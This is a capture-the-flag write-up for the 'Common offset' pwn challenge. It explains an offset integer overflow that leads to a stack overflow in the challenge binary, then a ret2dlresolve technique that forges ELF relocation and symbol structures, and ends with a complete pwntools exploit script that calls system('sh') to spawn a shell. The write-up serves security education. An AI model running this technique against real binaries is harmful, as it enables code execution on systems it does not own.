# Common offset

**CTF:** Srdnlen CTF 2026 Quals\
**Category:** pwn\
**Difficulty:** medium\
**Authors:** @church (Matteo Chiesa)

## Description

> I had an idea: what if we could treat some files as time series? Imagine if when you wrote to a file at a certain offset, that offset was maintained even when you wrote to another file. We'd have a perfect time log of when you wrote what to the files...
I made a dummy implementation of this; take a look.

## Overview

This pwn challenge is composed by an *amd64 64bit ELF* binary, with no modern protections, and the GOT filled at runtime.
> Arch:       amd64-64-little\
RELRO:      Partial RELRO\
Stack:      No canary found\
NX:         NX enabled\
PIE:        No PIE (0x400000)\
SHSTK:      Enabled\
IBT:        Enabled\
Stripped:   No

It comes with the dockerfile that loads the libc version `2.42-0ubuntu3`.

The program asks for a string, and then asks two writes. We can choose the index from 0 to 4, and the offset where to write (which needs to be less then 32). Then we can write something on a buffer.

## Solution

### Vulnerability and caveats

The most interesting element is the offset. When choosen, it isn't overwritten, but it is summed up to the previous. Specifically, it is summed casting it with `uint16`, and not using the original type `uint8`. This is vulnerable to an integer overflow: we can **overflow the offset**, incrementing by one the byte next to the offset, but keeping the original `uint8` offset less than 32.

The byte next to the offset is the index of the file where to write. We can increment this by one, after we have chosen it. So we can choose initially the last possible index, and then increment it by one, resulting in an index too big.

This means we can go **out of bounce the array of buffered files**, with the ability to write something on the pointer that immediately follow the array of buffer.
In that location there is a pointer to the file index, in the stack. So we can potentially write 31 bytes in the stack, triggering a **stack overflow**. With this, we can override the return address and the qword immediately after it.

But this comes with a caveat: we can trigger the offset overflow only for the second write, because we cannot do it when the offset starts from zero. So the first time we can write only in the intended buffers.

### Project the exploit

We have a 16 byte stack overflow, but what we can do with it? There is no win function. There are not incredile gadgets at the first glance. The binary is compiled without the use of the base pointer and without any *leave; ret;* gadget, so no stack pivoting is possible. The program has also a flag that checks if a *ret2main* is been triggered.
We have to understand where we can jump, and try to make us more room to get a leak, and still continue to control the operational flow.

Or maybe not, maybe the space we have is enough. Meet the ***ret2dlresolve*** technique. It exploits the method that a program with *Partial RelRO* itself uses to resolve the symbols it needs.
To exploits this technique, we need to be able to write in the *bss* a couple of forged structures, that will be used by the dinmanic linker to resolve a symbol chosen by us (for example `system()`). This will give us the ability to call that *libc* function without having any previous leak, making the program resolves its address for us.

Also the structures we have to forge has some constraints, and they have to point to each other in a particular way for the correct functional operation.

### Deepen the *ret2dlresolve* technique

When compiled with *Partial RelRO*, in a section of the program there are memorized the *ELF* structures to resolve every external function addresses.
When the program calls an external function, it jumps to the address stored in the correspondent *GOT* entry. If that function was never called before during the actual execution, in the *GOT* there isn't the actual address of that function. Instead there is the address of a brief routine, called *trampoline*. In the binary there is a different *trampoline* for each external function to resolve. This *trampoline* pushes in the stack a number, which indicates where is the first *ELF* structure to resolve that function, and then jumps to the `dl_resolve` routine to actually resolve the symbol.
If we want to resolve `system()`, the program don't have its *trampoline*, but we can mimic the same behavior using the stack overflow. We can return to the address of the routine that resolves the symbols, and immediately after after that return address we write the appropriate number, that will indicate where will be the first *ELF* structure that we will forge.

The first *ELF* structure needed to resolve a symbols is called *Elf64_Rela*:
```c
typedef struct {
  Elf64_Addr	r_offset;		/* 8 bytes */
  Elf64_Xword	r_info;			/* 8 bytes */
  Elf64_Sxword	r_addend; /* 8 bytes */
} Elf64_Rela;
```
This structure is 0x18 bytes long. The number pushed in the stack by the trampoline is the index to retrieve the *Elf64_Rela* structure, starting from the dynamic entry `JMPREL`, where there is the first of this structure. So in the stack we have to push the number `RELA_INDEX` so that `JMPREL + sizeof(Elf64_Rela) * RELA_INDEX` is the address where we will write the forged *Elf64_Rela* structure. 

In this structure, `r_offset` is an address where the resolved address will be written; normally it is the related *GOT* address, but can be any writable address.
`r_addend` can be any value in a standard scenario.
`r_offset` is used as two *uint32* values: the lower of them must be 7 to pass a sanity check; the higher is another index, used to retrieve the second *ELF* structure we need to forge.

The second *ELF* structure needed to resolve a symbols is called *Elf64_Sym*:
```c
typedef struct {
  Elf64_Word	st_name;		/* 4 bytes */
  unsigned char	st_info;	/* 1 bytes */
  unsigned char st_other;	/* 1 bytes */
  Elf64_Section	st_shndx;	/* 2 bytes */
  Elf64_Addr	st_value;		/* 8 bytes */
  Elf64_Xword	st_size;		/* 8 bytes */
} Elf64_Sym;
```
Also this structure is 0x18 bytes long. The higher 4-bytes of `Elf64_Rela.r_offset` is the index to retrieve the *Elf64_Sym* structure, starting from the dynamic entry `SYMTAB`, where there is the first of this structure. So in the higher 4-bytes of `Elf64_Rela.r_offset` we have to put the number `SYM_INDEX` so that `SYMTAB + sizeof(Elf64_Rela) * SYM_INDEX` is the address where we will write the forged *Elf64_Sym* structure. 

In this structure, `st_name` is the offset from the dynamic entry `STRTAB` to retrieve the name of the symbol to resolve. So in `st_name` we have to put the number `STR_OFFSET` so that `STRTAB + STR_OFFSET` is a pointer to the `system` string. In the program there isn't this string, so we have to write together with the structure we will forge.
`st_info`, `st_shndx`, `st_value` and `st_size` can be any value.
`st_other` must be a value multiple of 4.

### Write the forged structures

We have to write in some localtion both the *Elf64_Rela* and *Elf64_Sym* structures, together with the string `system`, using the 31 bytes the program gives us during the first write. This means we need to nest these structures, taking advantage of the fields that doesn't have any constraint.

To write all these structures, we need to accomplish some necessary condition.
First of all, to trigger the index incrementation we need to set an offset greater that 0. Otherwise we can't sum up to it something to overflow it. This means we need to nest the structures in a way so the first byte can be 0, because we will not write the first byte of the forged structures.
Also, using the indexes we can control, we don't have much flexibility. The addresses of the two structure must respect two constraints. Specifically, the address of the *Elf64_Rela* forged structure, minus the `JMPREL` address, must be a multiple of 0x18: `(ELF64_RELA_ADDRESS - JMPREL) % sizeof(Elf64_Rela) == 0`. Otherwise there is no integer index that will correctly point to our forged structure.
The same is for the other structure. The address of the *Elf64_Sym* forged structure, minus the `SYMTAB` address, must be a multiple of 0x18: `(ELF64_SYM_ADDRESS - SYMTAB) % sizeof(Elf64_Sym) == 0`.

Given all of these constraints, we can nest the structures in this way. The first 8 bytes are the `r_offset` of the *Elf64_Rela*, with an address with its less significant byte set to `0` (we don't write this byte explicitly in our payload, but it will be there since we are gonna start writing from offset `1`). Then the next 8 bytes are the `r_info`, with the `7` and the index for the next structure. After them should be `r_addend`, but this field has no constraint, so we can nest here the *Elf64_Sym* structure. So the `r_addend` field corresponds to the `st_name`, `st_info`, `st_other`, `st_shndx` fields. At this point we have occupied 24 bytes, but the next fields have no restrictions for their values. We have 8 bytes left that we can use (actually 7, because we can write 31 bytes, not 32), and those are perfect to write somewhere the `system` string.
Here the nested structures:
```c
typedef struct {
  r_offset;		/* 8 bytes */
  r_info;			/* 8 bytes */
  /* following 8 bytes corresponds to r_addend */
  st_name;		/* 4 bytes */
  st_info;	/* 1 bytes */
  st_other;	/* 1 bytes */
  st_shndx;	/* 2 bytes */
  /* following 8 bytes corresponds to st_value */
  system;		/* 8 bytes */
  // Elf64_Xword	st_size;		/* 8 bytes */
  // Elf64_Sxword	r_addend; /* 8 bytes */
} NestedElfStructs;
```
These nested structures have to be stored in addresses compliant with the cited assertions. We have to check if any file buffer in the program gives us the perfect alignment. Turns out that the file buffer at index `1`, at address `0x4040c0`, satisfies all the constraints, so the nested structures will be written there.

### Exploit

The exploits starts creating the first payload with the nested structures as described above, after checking if all the requirments are satisfied. Then we can already creating the second payload, which is a *ROP chain* calls the *dl_resolve* routine and pushes in the stack the correct number to retrieve the first forged structure.
We have to write the first payload in the file buffer of index `1`, using `1` as offset to trigger the overflow. Then to write the second payload we have to actually overflow the offset, to go out of bounce the buffers array. So we write the second payload putting `3` as index (which will become `4`), and `255` as offset (that will overflow to `0`).

In the end, the program actually calls `system()`, with the name we have inserted at the start of the program as argument. This means if we set `sh` as name, we get a shell!

```py
SIZEOF_ELF64_RELA = 0x18
SIZEOF_ELF64_SYM = 0x18
SYMBOL_NAME = b"system\0\0"
BINSH = b"sh"
JMPREL = exe.dynamic_value_by_tag("DT_JMPREL")
SYMTAB = exe.dynamic_value_by_tag("DT_SYMTAB")
STRTAB = exe.dynamic_value_by_tag("DT_STRTAB")

LEN_BUFFER = 0x20
BUFFER_INDEX = 1
WRITE_ADDRESS = exe.sym["buffers"] + BUFFER_INDEX*LEN_BUFFER
ELF64_RELA_ADDRESS = WRITE_ADDRESS + 0x0
ELF64_SYM_ADDRESS = WRITE_ADDRESS + 0x10
SYMBOL_ADDRESS = WRITE_ADDRESS + 0x18

print(f"{hex(ELF64_RELA_ADDRESS) = }")
print(f"{hex(ELF64_SYM_ADDRESS) = }")
print(f"{hex(JMPREL) = }")
print(f"{hex(SYMTAB) = }")

assert (ELF64_RELA_ADDRESS - JMPREL) % SIZEOF_ELF64_RELA == 0
assert (ELF64_SYM_ADDRESS - SYMTAB) % SIZEOF_ELF64_SYM == 0

payload1 = pwn.flat(
  # struct Elf64_Rela
  pwn.p64(0x404100), # address: where to write symbol address
  pwn.p32(0x7), # r_info[LOWER]: must 0x7 to pass sanity check as functions
  pwn.p32((ELF64_SYM_ADDRESS - SYMTAB) // SIZEOF_ELF64_SYM), # r_info[HIGHER]: symtab offset
  
  # struct Elf64_Sym
  pwn.p32(SYMBOL_ADDRESS - STRTAB), # st_name: strtab offset
  pwn.p8(0x12), # st_info: can be anything (in teory must 0x12)
  pwn.p8(0x0), # st_other: must be multiple of 0x4
  pwn.p16(0x0), # st_shndx: can be anything
  # 0x0, # st_value: can be anything
  # 0x0, # st_size: can be anything

  # Strings
  SYMBOL_NAME,
)[1:-1]
print(payload1)
print(len(payload1))

rop = ROP(exe)
rop.pad(15) # pad
rop.raw(exe.get_section_by_name(".plt").header.sh_addr)  # jump to reloc subroutine that push linkmap and call dl_runtime_resolve_xsavec
rop.raw((ELF64_RELA_ADDRESS - JMPREL) // SIZEOF_ELF64_RELA) # push reloc_arg
payload2 = bytes(rop)
print(payload2)
print(len(payload2))


io.sendlineafter(b"> ", BINSH)
io.sendlineafter(b"> ", f"{BUFFER_INDEX}".encode())
io.sendlineafter(b"> ", b"1")
io.sendafter(b"> ", payload1)

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"> ", b"255")
io.sendafter(b"> ", payload2)

io.interactive()
```

**srdnlen{DL-r35m4LLv3}**
